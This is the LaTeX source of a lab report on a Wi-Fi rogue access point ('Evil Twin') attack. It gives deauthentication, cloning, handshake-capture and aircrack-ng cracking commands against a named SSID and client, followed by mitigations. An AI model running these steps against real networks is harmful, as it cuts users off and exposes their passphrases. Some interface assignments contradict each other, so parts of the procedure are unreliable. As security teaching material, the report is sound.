\documentclass[11pt,a4paper]{article}
\usepackage[margin=2.4cm]{geometry}
\usepackage[T1]{fontenc}
\usepackage{xcolor}
\usepackage{enumitem}
\usepackage{titlesec}
\usepackage[hidelinks]{hyperref}
\usepackage{graphicx}
\usepackage{listings}
\usepackage{caption}
\usepackage{float}

% Color Theme
\definecolor{noc}{HTML}{0F766E}
\definecolor{nocdark}{HTML}{134E4A}
\definecolor{codebg}{HTML}{F0FDFA}
\definecolor{codeframe}{HTML}{99F6E4}

% Code Listing Style
\lstset{
    backgroundcolor=\color{codebg},
    basicstyle=\ttfamily\small,
    breaklines=true,
    frame=single,
    rulecolor=\color{codeframe},
    keywordstyle=\color{nocdark}\bfseries,
    stringstyle=\color{noc},
    commentstyle=\color{gray}\itshape,
    columns=fullflexible,
    keepspaces=true,
    showstringspaces=false
}

% Section Formatting
\titleformat{\section}{\large\bfseries\color{nocdark}}{\thesection}{0.8em}{}
\titleformat{\subsection}{\normalsize\bfseries\color{noc}}{\thesubsection}{0.8em}{}

\begin{document}

\begin{center}
  {\LARGE\bfseries Cybersecurity Lab --- ``Evil Twin'' Attack}\\[4pt]
  {\large Wi-Fi Rogue Access Point Simulation and WPA2 Cracking}\\[8pt]
  {\color{noc}\rule{\textwidth}{1pt}}\\[6pt]
  {\small Marouane Aabirrouche --- IT Infrastructure Specialist --- R\'eseaux \& Syst\`emes}\\
  {\small Project Report PRJ-04 \,\textbullet\, Isolated Educational Lab Only}
\end{center}

\vspace{0.5cm}

\section*{Scope and Ethics Statement}
This work was performed in a \emph{controlled, isolated laboratory environment}
against equipment and networks owned by the operator, for security-education
purposes only. No third-party networks, devices, or users were targeted at any
point. The value of the exercise is understanding \emph{why} legacy WPA2
deployments remain attackable and what defenses actually mitigate the technique.

\section{Overview}
This lab simulates a Wi-Fi \emph{Rogue Access Point} (``Evil Twin'') attack: a
hostile access point that imitates a legitimate one so that clients associate
with the attacker instead of the real network. The setup uses two wireless adapters
in Kali Linux to mimic a target Wi-Fi network, capture WPA handshakes, and
demonstrate offline password cracking. The exercise does not provide internet
access to connected clients and is designed strictly for educational purposes.

\section{Objectives}
\begin{itemize}[leftmargin=1.6em]
  \item Understand client-side network selection: why devices roam to a
        stronger signal broadcasting identical credentials.
  \item Configure wireless adapters for monitor mode and AP mode operations.
  \item Reproduce an Evil Twin access point targeting SSID \texttt{ALHN-9B02} 
        (BSSID: \texttt{5C:8C:30:94:CE:99}, Channel: 2).
  \item Capture WPA2 four-way handshakes from controlled test clients.
  \item Perform offline dictionary attacks using custom-generated wordlists.
  \item Map findings to concrete defenses for home and small-business networks.
\end{itemize}

\section{Lab Topology and Tools}
\begin{table}[h]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{l l}
\textbf{Component} & \textbf{Configuration}\\
\hline
Legitimate AP & Target router (SSID: \texttt{ALHN-9B02}, BSSID: \texttt{5C:8C:30:94:CE:99}, Ch: 2)\\
Adapter 1 (\texttt{wlan0}) & Monitor mode for reconnaissance and de-authentication\\
Adapter 2 (\texttt{wlan1}) & AP mode for evil twin access point\\
Victim client & Test device (MAC: \texttt{7A:07:52:69:A9:59})\\
Analysis host & Kali Linux with wireless tools\\
Toolchain & \texttt{aircrack-ng}, \texttt{hostapd}, \texttt{dnsmasq}, \texttt{crunch}\\
Isolation & Air-gapped segment; no production traffic present\\
\end{tabular}
\end{table}

\section{Methodology and Execution}

\subsection{Phase 1: Reconnaissance and Monitor Mode Setup}
The first step involves placing the wireless adapter into monitor mode to capture
all wireless traffic in the environment. This allows passive reconnaissance of
nearby networks without transmitting any packets.

\begin{lstlisting}[language=bash, caption={Enabling monitor mode on wlan0}]
sudo airmon-ng check kill  # Stop interfering processes
sudo airmon-ng start wlan0
\end{lstlisting}

\begin{figure}[H]
    \centering
    \includegraphics[width=\linewidth]{image1.png}
    \caption{Wireless interface configuration showing \texttt{wlan0} and \texttt{wlan1} interfaces, 
    followed by successful activation of monitor mode (\texttt{wlan0mon}) using \texttt{airmon-ng}.}
    \label{fig:monitor}
\end{figure}

With monitor mode enabled, we scan for nearby networks to identify the target:

\begin{lstlisting}[language=bash, caption={Scanning for wireless networks}]
sudo airodump-ng wlan1
\end{lstlisting}

\begin{figure}[H]
    \centering
    \includegraphics[width=\linewidth]{image2.png}
    \caption{Network reconnaissance showing multiple wireless networks. Target identified: 
    \texttt{ALHN-9B02} (BSSID: \texttt{5C:8C:30:94:CE:99}) on Channel 2 with WPA2/CCMP encryption.}
    \label{fig:scan}
\end{figure}

Once the target is identified, we focus the capture on the specific network:

\begin{lstlisting}[language=bash, caption={Targeted packet capture}]
sudo airodump-ng --bssid 5C:8C:30:94:CE:99 --channel 2 --write evil_twin_capture wlan1
\end{lstlisting}

\begin{figure}[H]
    \centering
    \includegraphics[width=\linewidth]{image3.png}
    \caption{Focused capture on target network \texttt{ALHN-9B02} showing an active client 
    (\texttt{7A:07:52:69:A9:59}) connected with strong signal strength (PWR: -42).}
    \label{fig:target}
\end{figure}

\subsection{Phase 2: Evil Twin Access Point Configuration}
The rogue access point is configured to clone the target network's SSID and channel,
making it indistinguishable to clients from the legitimate AP.

\begin{lstlisting}[language=bash, caption={hostapd.conf configuration}]
interface=wlan1
driver=nl80211
ssid=ALHN-9B02
hw_mode=g
channel=2
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
\end{lstlisting}

\begin{figure}[H]
    \centering
    \includegraphics[width=\linewidth]{image4.png}
    \caption{hostapd configuration file showing the evil twin AP settings: cloning SSID 
    \texttt{ALHN-9B02} on channel 2 using interface \texttt{wlan1}.}
    \label{fig:hostapd_conf}
\end{figure}

Starting the rogue access point:

\begin{lstlisting}[language=bash, caption={Launching the evil twin AP}]
sudo hostapd /etc/hostapd/hostapd.conf
\end{lstlisting}

\begin{figure}[H]
    \centering
    \includegraphics[width=\linewidth]{image5.png}
    \caption{Successful initialization of the evil twin access point. The interface state 
    transitions from UNINITIALIZED to ENABLED, and AP is now broadcasting.}
    \label{fig:hostapd_run}
\end{figure}

\subsection{Phase 3: DHCP Services Configuration}
To provide IP addresses to clients connecting to the evil twin (without internet access),
we configure dnsmasq as a DHCP server.

\begin{lstlisting}[language=bash, caption={Assigning static IP to the AP interface}]
sudo ifconfig wlan0 192.168.1.1 netmask 255.255.255.0 up
\end{lstlisting}

\begin{figure}[H]
    \centering
    \includegraphics[width=\linewidth]{image6.png}
    \caption{Configuring the wireless interface with static IP address \texttt{192.168.1.1} 
    to serve as the gateway for connected clients.}
    \label{fig:ifconfig}
\end{figure}

\begin{lstlisting}[language=bash, caption={dnsmasq.conf configuration}]
interface=wlan1
dhcp-range=192.168.1.2,192.168.1.100,12h
\end{lstlisting}

\begin{figure}[H]
    \centering
    \includegraphics[width=\linewidth]{image7.png}
    \caption{dnsmasq configuration file setting up DHCP range from \texttt{192.168.1.2} to 
    \texttt{192.168.1.100} with 12-hour lease time on interface \texttt{wlan1}.}
    \label{fig:dnsmasq}
\end{figure}

Starting the DHCP service:

\begin{lstlisting}[language=bash]
sudo dnsmasq -C /etc/dnsmasq.conf
\end{lstlisting}

\subsection{Phase 4: De-authentication Attack}
To force clients to disconnect from the legitimate AP and connect to our evil twin,
we send de-authentication frames targeting the specific client.

\begin{lstlisting}[language=bash, caption={De-authentication attack}]
sudo aireplay-ng --deauth 20 -a 5C:8C:30:94:CE:99 -c 7A:07:52:69:A9:59 wlan1
\end{lstlisting}

This command sends 20 de-authentication packets to force the client 
(\texttt{7A:07:52:69:A9:59}) to disconnect from the legitimate AP 
(\texttt{5C:8C:30:94:CE:99}). The client will then automatically reconnect, 
potentially to our stronger-signal evil twin.

\subsection{Phase 5: Handshake Capture and Password Cracking}
Once the client reconnects, the WPA2 four-way handshake is captured. We then perform
an offline dictionary attack using a custom-generated wordlist.

\begin{lstlisting}[language=bash, caption={Custom wordlist generation with crunch}]
crunch 8 8 24679 -o numeric-8-digits.txt
\end{lstlisting}

This generates a wordlist containing all possible 8-character combinations using
only the digits 2, 4, 6, 7, and 9, significantly reducing the keyspace compared to
a full numeric attack.

\begin{lstlisting}[language=bash, caption={Offline password cracking}]
sudo aircrack-ng -w numeric-8-digits.txt evil_twin_capture-01.cap
\end{lstlisting}

\begin{figure}[H]
    \centering
    \includegraphics[width=\linewidth]{image9.png}
    \caption{Successful password cracking with aircrack-ng. The WPA2 passphrase 
    \textbf{29264927} was found after testing 381,897 keys in 30 seconds 
    (12,712.89 k/s). The Master Key and Transient Key are displayed, confirming 
    successful handshake verification.}
    \label{fig:crack}
\end{figure}

\section{Results and Analysis}

\subsection{Key Findings}
\begin{itemize}[leftmargin=1.6em]
  \item \textbf{Password Recovered:} \texttt{29264927} (8-digit numeric PIN)
  \item \textbf{Cracking Time:} 30 seconds
  \item \textbf{Keys Tested:} 381,897 out of 390,625 possible combinations (97.77\%)
  \item \textbf{Cracking Speed:} 12,712.89 keys/second
  \item \textbf{Attack Vector:} The weak 8-digit numeric password using only 5 possible 
        characters (2,4,6,7,9) created a small keyspace of $5^8 = 390,625$ combinations, 
        making it trivially crackable.
\end{itemize}

\subsection{Security Implications}
\begin{itemize}[leftmargin=1.6em]
  \item \textbf{Weak Passphrase Entropy:} An 8-digit numeric password has only 
        $\log_2(10^8) \approx 26.6$ bits of entropy. Using only 5 characters reduces 
        this to $\log_2(5^8) \approx 18.6$ bits, which is extremely weak.
  \item \textbf{Offline Attack Feasibility:} Once the handshake is captured, attackers 
        can attempt unlimited password guesses without detection.
  \item \textbf{Client Behavior:} Devices automatically connect to the strongest signal 
        with a known SSID, making evil twin attacks highly effective.
  \item \textbf{No User Warning:} Users receive no indication that they've connected 
        to a rogue AP.
\end{itemize}

\section{Mitigations and Best Practices}

\subsection{For Network Administrators}
\begin{itemize}[leftmargin=1.6em}
  \item \textbf{Upgrade to WPA3:} WPA3-SAE (Simultaneous Authentication of Equals) resists 
        offline dictionary attacks and provides forward secrecy.
  \item \textbf{Strong Passphrases:} Use passphrases with at least 12-15 characters mixing 
        uppercase, lowercase, numbers, and symbols. Avoid default router PINs or simple 
        numeric passwords.
  \item \textbf{802.1X Enterprise:} Implement WPA2/WPA3-Enterprise with RADIUS authentication 
        to eliminate pre-shared keys entirely.
  \item \textbf{Network Monitoring:} Deploy WIDS (Wireless Intrusion Detection Systems) to 
        detect:
        \begin{itemize}
          \item De-authentication storms
          \item Duplicate SSIDs with different BSSIDs
          \item Rogue APs on the same channel
          \item Unusual client re-association patterns
        \end{itemize}
  \item \textbf{Client Isolation:} Enable AP client isolation to prevent lateral movement 
        even if a client connects to a rogue AP.
\end{itemize}

\subsection{For End Users}
\begin{itemize}[leftmargin=1.6em}
  \item \textbf{Verify Network Authenticity:} Be cautious when connecting to networks, 
        especially in public spaces. Verify the BSSID when possible.
  \item \textbf{Use VPN:} Always use a VPN when connecting to Wi-Fi networks to encrypt 
        traffic above layer 2.
  \item \textbf{Forget Networks:} Remove saved networks that you no longer use to prevent 
        automatic connections.
  \item \textbf{HTTPS Everywhere:} Ensure websites use HTTPS to protect credentials even 
        on compromised networks.
  \item \textbf{Monitor Connections:} Be suspicious of unexpected network disconnections 
        or slow internet speeds, which may indicate a de-auth attack.
\end{itemize}

\section{Outcomes and Lessons Learned}
This exercise successfully demonstrated:
\begin{enumerate}
  \item A complete evil twin attack chain from reconnaissance to password recovery
  \item The critical importance of passphrase strength in WPA2 security
  \item How quickly weak passwords can be cracked offline (30 seconds in this case)
  \item The effectiveness of client de-authentication in forcing re-association
  \item Practical mitigation strategies for both administrators and users
\end{enumerate}

The lab reinforced the operational principle that matters most in security work: 
\emph{validating assumptions empirically}. Every claim above was observed and tested 
in the lab environment, not taken on faith. The demonstration clearly shows why WPA2 
with weak passphrases remains vulnerable and why the industry is moving toward WPA3 
and enterprise authentication methods.

\vfill
\begin{center}
  {\small\color{noc}\rule{0.5\textwidth}{0.6pt}}\\[4pt]
  {\footnotesize Generated Documentation --- NOC Portfolio, PRJ-04}\\
  {\footnotesize Educational Lab Exercise --- No Unauthorized Systems Were Accessed}\\
  {\footnotesize Bouznika, Morocco \,\textbullet\, \today}
\end{center}

\end{document}